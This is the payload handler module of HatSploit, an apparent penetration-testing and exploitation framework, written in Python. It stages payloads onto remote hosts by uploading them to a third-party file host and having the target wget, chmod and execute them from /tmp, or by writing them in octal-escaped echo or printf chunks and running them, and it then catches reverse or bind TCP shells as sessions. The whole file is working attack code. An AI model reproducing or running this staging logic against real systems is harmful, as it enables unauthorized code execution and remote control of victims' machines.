#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import requests
import binascii

from core.base.sessions import Sessions
from core.base.storage import LocalStorage
from core.cli.badges import Badges
from core.modules.modules import Modules
from data.utils.handler.handler.session import HatSploitSession
from core.utils.tcp.tcp import TCP


class Handler(TCP):
    sessions = Sessions()
    local_storage = LocalStorage()
    modules = Modules()
    badges = Badges()

    def listen_session(self, local_host, local_port, timeout=None, session=HatSploitSession):
        try:
            client, address = self.listen(local_host, local_port, timeout)
            session = session()
            session.open(client)
            return session, address
        except Exception:
            self.badges.output_error("Failed to handle session!")
            return None, None

    def connect_session(self, remote_host, remote_port, timeout=None, session=HatSploitSession):
        try:
            client = self.connect(remote_host, remote_port, timeout)
            session = session()
            session.open(client)
            return session
        except Exception:
            self.badges.output_error("Failed to handle session!")
            return None

    def bytes_to_octal(self, bytes_obj, extra_zero=False):
        byte_octals = []
        for byte in bytes_obj:
            byte_octal = '\\0' if extra_zero else '\\' + oct(byte)[2:]
            byte_octals.append(byte_octal)
        return ''.join(byte_octals)

    def wget_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False, execute=True):
        self.badges.output_process("Sending payload stage...")
        filename = binascii.hexlify(os.urandom(8)).decode()
        path = location + '/' + filename

        wget_bin = binascii.hexlify(os.urandom(8)).decode()
        wget_file = binascii.hexlify(os.urandom(8)).decode()
        
        wget_container = f"https://dev.filebin.net/{wget_bin}"
        wget_server = f"https://dev.filebin.net/{wget_bin}/{wget_file}"

        wget_stream = "wget '{}' -qO {}"

        requests.post(wget_server.format(wget_bin, wget_file), data=payload)
        self.badges.output_process("Uploading payload...")

        if execute:
            self.badges.output_process("Executing payload...")
            command = f"{wget_stream.format(wget_server, path)} {delim} chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\""
            args = args if args is not None else ""
        else:
            command = wget_stream.format(wget_server, path)

        if encode:
            sender(*args, f"{command}\n".encode())
        else:
            sender(*args, {command})
        requests.delete(wget_container)

    def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False, execute=True):
        self.badges.output_process("Sending payload stage...")
        filename = binascii.hexlify(os.urandom(8)).decode()
        path = location + '/' + filename

        echo_stream = "echo -n '{}' >> {}"
        echo_max_length = 100

        size = len(payload)
        num_parts = int(size / echo_max_length) + 1

        for i in range(0, num_parts):
            current = i * echo_max_length
            block = self.bytes_to_octal(payload[current:current + echo_max_length], extra_zero=True)
            command = echo_stream.format(block, path)

            self.badges.output_multi(f"Uploading payload... ({str(current)}/{str(size)})")
            if encode:
                sender(*args, (command + '\n').encode())
            else:
                sender(*args, command)

        if execute:
            self.badges.output_process("Executing payload...")
            args = args if args is not None else ""
            if encode:
                sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\"\n".encode())
            else:
                sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\"")
    
    def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False, execute=True):
        self.badges.output_process("Sending payload stage...")
        filename = binascii.hexlify(os.urandom(8)).decode()
        path = location + '/' + filename

        printf_stream = "printf '{}' >> {}"
        printf_max_length = 100

        size = len(payload)
        num_parts = int(size / printf_max_length) + 1

        for i in range(0, num_parts):
            current = i * printf_max_length
            block = self.bytes_to_octal(payload[current:current + printf_max_length])
            command = printf_stream.format(block, path)

            self.badges.output_multi(f"Uploading payload... ({str(current)}/{str(size)})")
            if encode:
                sender(*args, (command + '\n').encode())
            else:
                sender(*args, command)

        if execute:
            self.badges.output_process("Executing payload...")
            args = args if args is not None else ""
            if encode:
                sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\"\n".encode())
            else:
                sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\"")

    def set_session_details(self, payload, session):
        if not session.details['Type']:
            session.details['Type'] = 'custom'

        session.details['Platform'] = payload['Platform']
        return session

    def handle_session(self, host, port, payload, sender=None, args=[], delim=';', location='/tmp', timeout=None, method=None, post="printf"):
        if payload['Payload'] is None:
            self.badges.output_error("Payload stage is not found!")
            return False

        encode = False
        if sender is not None:
            session = payload['Session'] if payload['Session'] is not None else HatSploitSession
            if payload['Category'].lower() == 'stager':
                if post.lower() == 'printf':
                    self.printf_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
                elif post.lower() == 'echo':
                    self.echo_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
                elif post.lower() == 'wget':
                    self.wget_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
                else:
                    self.output_warning("Invalid post method, using printf by default.")
                    self.printf_stage(payload['Payload'], sender, args, payload['Args'], delim, location, encode)
            elif payload['Category'].lower() == 'single':
                sender(*args, payload['Payload'])
            else:
                self.badges.output_error("Invalid payload category!")
                return False
        else:
            if method is not None:
                encode = True
                if method.lower() == 'reverse_tcp':
                    new_session, remote_host = self.listen_session(host, port, timeout, HatSploitSession)
                    if not new_session and not remote_host:
                        return False

                if method.lower() == 'bind_tcp':
                    new_session = self.connect_session(host, port, timeout, HatSploitSession)
                    remote_host = host
                    if not new_session:
                        return False

                if payload['Category'].lower() == 'stager':
                    if post.lower() == 'printf':
                        self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
                    elif post.lower() == 'echo':
                        self.echo_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
                    elif post.lower() == 'wget':
                        self.wget_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
                    else:
                        self.output_warning("Invalid post method, using printf by default.")
                        self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], delim, location, encode)
                elif payload['Category'].lower() == 'single':
                    new_session.send_command(payload['Payload'])
                else:
                    self.badges.output_error("Invalid payload category!")
                    return False
            else:
                self.badges.output_error("Failed to execute payload stage!")
                return False

        if payload['Type'].lower() == 'one_side':
            self.badges.output_warning("Payload completed but no session was created.")
            return True

        session = payload['Session'] if payload['Session'] is not None else HatSploitSession

        if payload['Type'].lower() == 'bind_tcp':
            new_session = self.connect_session(host, port, timeout, session)
            remote_host = host
            if not new_session:
                return False

        if payload['Type'].lower() == 'reverse_tcp':
            new_session, remote_host = self.listen_session(host, port, timeout, session)
            if not new_session and not remote_host:
                return False

        new_session = self.set_session_details(payload, new_session)
        session_platform = new_session.details['Platform']
        session_type = new_session.details['Type']

        session_id = self.sessions.add_session(session_platform, session_type, remote_host, port, new_session)
        self.badges.output_success("Session " + str(session_id) + " opened!")
        return True
